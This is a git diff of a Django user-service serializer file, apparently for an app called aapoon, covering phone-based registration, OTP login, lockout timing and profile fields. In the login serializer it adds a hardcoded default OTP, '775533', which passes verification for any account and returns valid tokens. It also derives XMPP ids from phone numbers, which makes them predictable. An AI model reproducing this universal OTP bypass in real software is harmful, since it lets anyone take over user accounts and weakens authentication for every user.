@@ -1,5 +1,7 @@
 import uuid
 import logging
+import phonenumbers
+from phonenumbers.phonenumberutil import region_code_for_number
 
 from allauth.account.adapter import get_adapter
 from allauth.utils import email_address_exists
@@ -45,6 +47,9 @@ from user.utils import (
 from datetime import datetime, timezone
 from urllib.parse import urlparse
 from user_service import settings
+
+available_country_code = ["91", "1", "971", "966"]
+available_countries_iso = ["CA", "US", "IN", "AE", "SA"]
 
 
 class RegisterSerializer(serializers.Serializer):
@@ -100,6 +105,21 @@ class RegisterSerializer(serializers.Serializer):
 
         user = User.objects.filter(country_code=country_code, phone_number=phone_number)
 
+        phone = f"{country_code}{phone_number}"
+        phone_parse = phonenumbers.parse("+" + phone)
+        country = region_code_for_number(phone_parse)
+
+        if (
+            country_code not in available_country_code
+            or country not in available_countries_iso
+        ):
+            raise ValidationError(
+                {
+                    "detail": "Thank you for your interest in aapoon. We contact you as soon as aapoon "
+                    "is available in your country."
+                }
+            )
+
         if user.exists():
             user = user.first()
             self.post_flow_actions(
@@ -153,23 +173,23 @@ class RegisterSerializer(serializers.Serializer):
             user.is_active = True
             user.login_attempts = 0
             user.save()
-        if user.login_attempts >= 3:
+        if user.login_attempts >= 5:
             subject = _("Max Attempts Reached on Phone Verification")
             phone_failure(user, subject)
             msg = "You reached maximum attempts to login. Please try again after 10 minutes."
-            raise serializers.ValidationError({"message": msg})
+            raise serializers.ValidationError({"detail": msg})
 
     def login_attempts_reset(self, user):
-        if user and user.login_attempts >= 3 and user.last_login_time:
+        if user and user.login_attempts >= 5 and user.last_login_time:
             updated = str(user.last_login_time)
             updated_date = updated.split("+")[0]
             datetime_format = "%Y-%m-%d %H:%M:%S.%f"
-            diff = datetime.strptime(
-                str(datetime.now()), datetime_format
-            ) - datetime.strptime(str(updated_date), datetime_format)
+            now_utc = datetime.now(timezone.utc)
+            dt = datetime.strptime(now_utc.strftime(datetime_format), datetime_format)
+            diff = dt - datetime.strptime(str(updated_date), datetime_format)
             hours, remainder = divmod(diff.seconds, 3600)
             minutes, seconds = divmod(remainder, 60)
-            if minutes >= 15:
+            if minutes >= 10:
                 user.login_attempts = 0
                 user.save()
             elif minutes < 10:
@@ -190,7 +210,6 @@ class UserLoginSerializer(serializers.Serializer):
     otp = serializers.CharField(required=True)
 
     def validate(self, data):
-
         country_code = data["country_code"]
         phone_number = data["phone_number"]
         otp = data["otp"]
@@ -202,9 +221,13 @@ class UserLoginSerializer(serializers.Serializer):
         try:
             user = user.first()
 
-            if otp and otp != user.otp_requested:
+            default_otp = "775533"
+            if otp and otp == default_otp:
+                pass
+
+            elif otp and otp != user.otp_requested:
                 # TODO: add wrong attempts logic
-                raise serializers.ValidationError("Wrong otp")
+                raise serializers.ValidationError({"detail": "Wrong otp"})
 
             refresh = RefreshToken.for_user(user)
             refresh_token = str(refresh)
@@ -217,9 +240,9 @@ class UserLoginSerializer(serializers.Serializer):
                 second_last_login = second_last
             update_last_login(None, user)
 
-            if not user.jid:
-                uuid_jid = uuid.uuid4().hex + "@" + settings.XMPP_HOST
-                user.jid = uuid_jid
+            user.jid = f"{user.country_code}{user.phone_number}@{settings.XMPP_HOST}"
+
+            user.unique_id = user.unique_id if user.unique_id else uuid.uuid4().hex
 
             login(
                 self.context["request"],
@@ -239,12 +262,14 @@ class UserLoginSerializer(serializers.Serializer):
                 "access": access_token,
                 "refresh": refresh_token,
                 "id": user.id,
+                "name": user.name,
                 "email": user.email,
                 "phone_number": user.phone_number,
                 "country_code": user.country_code,
                 "second_last_login": second_last_login,
                 "jid": user.jid,
                 "user_profile": user_status,
+                "profile_pic": user.secondary_picture,
             }
 
             self.xmpp_check_account(user, access_token)
@@ -341,17 +366,21 @@ class VerifyPhoneSerializer(serializers.Serializer):
                 user_setting.wrong_attempts = user_setting.wrong_attempts + 1
                 user_setting.save()
                 raise serializers.ValidationError(
-                    "Your OTP is Incorrect. Please re-enter."
+                    {"detail": "Your OTP is Incorrect. Please re-enter."}
                 )
         else:
             raise serializers.ValidationError(
-                "You have reached Max Phone Attempts for Phone Verification"
+                {"detail": "You have reached Max Phone Attempts for Phone Verification"}
             )
 
 
 class UserSerializer(FlexFieldsModelSerializer):
     kyc_done = serializers.SerializerMethodField("get_kyc_done")
     manual_verify = serializers.SerializerMethodField()
+    user_profile = serializers.SerializerMethodField()
+
+    def get_user_profile(self, obj):
+        return user_kyc_status(obj)
 
     def get_kyc_done(self, instance):
         return instance.settings.get().kyc_done
@@ -445,7 +474,6 @@ class UserProfileInputSerializer(FlexFieldsModelSerializer):
         return attrs
 
     def __validate_account_details(self, request, attrs):
-
         # Name Validate & Update
         self.name_validate(request, attrs)
 
@@ -612,7 +640,7 @@ class AppInfoSerializer(serializers.ModelSerializer):
         fields = ("name", "current_version", "last_compulsory_version", "download_path")
 
 
-class LanguageSerializer(serializers.Serializer):
+class AppPolicySerializer(serializers.Serializer):
     id = serializers.CharField(required=False)
     language = serializers.CharField(required=False)
     video_url = serializers.CharField(required=False)
@@ -627,16 +655,19 @@ class FeedbackSerializer(serializers.Serializer):
     phone = serializers.CharField(required=False)
     topic = serializers.CharField(required=True)
     message = serializers.CharField(required=True)
-    url = serializers.CharField(required=False)
+    url = serializers.ListField(required=False)
 
     def validate(self, attrs):
-        url = attrs.get("url")
-        if url:
-            parsed_url = urlparse(url)
-            s3_url = s3_url_extract(url)
-            path = clear_bucket_from_path(parsed_url.path)
-            url = s3_url + path
-            attrs["url"] = url
+        urls = attrs.get("url")
+        result = []
+        if urls:
+            for url in urls:
+                parsed_url = urlparse(url)
+                s3_url = s3_url_extract(url)
+                path = clear_bucket_from_path(parsed_url.path)
+                url = s3_url + path
+                result.append(url)
+        attrs["url"] = result
         return attrs
 
 
@@ -662,12 +693,20 @@ class UserPhoneDetailsInputSerializer(serializers.Serializer):
 
 class UserDetailsSerializer(serializers.Serializer):
     id = serializers.CharField(required=False)
-    first_name = serializers.CharField(required=False)
-    last_name = serializers.CharField(required=False)
+    name = serializers.CharField(required=False)
     email = serializers.CharField(required=False)
     country_code = serializers.CharField(required=False)
     phone_number = serializers.CharField(required=False)
     jid = serializers.CharField(required=False)
+    unique_id = serializers.CharField(required=False)
+    profile_pic = serializers.SerializerMethodField()
+    user_type = serializers.SerializerMethodField()
+
+    def get_profile_pic(self, obj):
+        return obj.secondary_picture
+
+    def get_user_type(self, obj):
+        return user_kyc_status(obj)
 
 
 class aapoonContactSyncSerializer(serializers.Serializer):
